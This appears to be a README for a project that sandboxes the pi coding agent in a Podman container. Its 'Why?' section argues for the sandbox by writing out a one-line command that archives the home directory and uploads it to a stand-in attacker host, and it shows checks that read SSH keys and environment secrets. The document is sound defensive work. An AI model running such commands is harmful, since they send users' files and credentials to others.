# Sandboxed Pi
> Run [`pi`](https://pi.dev/) in a Podman container so it can only access directories explicitly mounted.

<!-- BEGIN mktoc {"min_depth": 2} -->

- [Files](#files)
- [Usage](#usage)
  - [Alias](#alias)
  - [Migrating from existing installation](#migrating-from-existing-installation)
- [Installing additional tools](#installing-additional-tools)
- [Why?](#why)
<!-- END mktoc -->

## Files

- `Dockerfile` builds Pi on Node.js 24 LTS.
- `run-pi-podman.sh` builds the image and runs Pi with the selected project mounted at `/workspace`.

## Usage

```bash
chmod +x sandboxed/run-pi-podman.sh

# Mount the current directory
sandboxed/run-pi-podman.sh

# Or mount a specific project
sandboxed/run-pi-podman.sh /path/to/project
```

### Alias

Create an alias for easy invocation

```bash
# in .bashrc, .zshrc, or equivalent of your shell
alias pic="/path/to/repo/run-pi-podman.sh"
```

Use the alias like `pic` or `pic /some/path/to/expose`

then invoke with `pic`. 

### Migrating from existing installation

To copy your existing host Pi config into the volume, run the following once:

```bash
podman volume create pi-sandbox-agent
podman run --rm --user root \
  -v pi-sandbox-agent:/target \
  -v "$HOME/.pi/agent:/source:ro" \
  node:24-bookworm-slim \
  sh -lc 'cp -a /source/. /target/ && chown -R node:node /target'
```

To inspect or remove it:

```bash
podman volume inspect pi-sandbox-agent
podman volume rm pi-sandbox-agent
```

## Installing additional tools

Additional packages from [https://pi.dev/packages](https://pi.dev/packages) can be installed inside the running container by executing the required commands through `pi`:

1. Start `pic`
2. Run `!! pi install <package>` inside pi to install the tool

For example, to install the [`pi-web-access`](https://pi.dev/packages/pi-web-access) extension:
```bash
# Start pi
pic
# Run the install command
!! pi install npm:pi-web-access
```

Extensions are persisted between sessions in the container volume.

## Why?

Agents are an interesting technology, but by default they get access to _way to many_  things. An agent executed on a host can do anything by default, runs with the same privileges as the executing user, and can spawn sub-agents who can rapidly work through a system in the background. Kinda scary, right? Nothing really prevents an agent from running a command like `tar -czf home.tar.gz $HOME/ && curl -X POST -H "Content-Type: multipart/form-data" -F "data=@home.tar.gz" https://evil-example.com/upload` in the background - and just like that the contents of the home dir are uploaded somewhere.

Some quick checks:
Run `pi` (or any other agent harness) on the host, then execute ... 

- ... `printenv` - this is all the secrets the agent can see and could exfiltrate immediately if acting malicious
- ... `ls -l /` - this is all the files, from the system root dir forward, the agent can access
- ... `ls -l ~/.config` - this is all the config file (all your config files) the agent can see
- ... `cat ~/.ssh/*` - this is the ssh keys the agent can access

Some operating systems, like MacOS, prevent access to files and folders and require an explicit approval, which is better than nothing but sitll not good enough. 

Giving an agent unristricted access to a computer is a huge security risk. Agents - depending on the model - also tend to aggresively scan local folders. OpenAI GPT-5.5, asked to implement a custom theme for pi, attempted to scan all paths it could find on my device - despite the documentation clearly stating themes belong in `~/.pi/agent/theme/`. 

Anyways! Now, with `pic` there is already a LOT less things exposed to the LLM, for example the `printenv` looks like this:

```bash
pic
!! printenv
 PI_CODING_AGENT=true
 HOSTNAME=343432f1a3d2
 YARN_VERSION=1.22.22
 PWD=/workspace
 PI_VERSION=0.78.1
 container=podman
 HOME=/home/node
 TERM=xterm
 SHLVL=0
 PATH=/home/node/.pi/agent/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 NODE_VERSION=24.16.0
 _=/usr/bin/printenv
```

and the file system only contains the current working directory - not the entire file system.
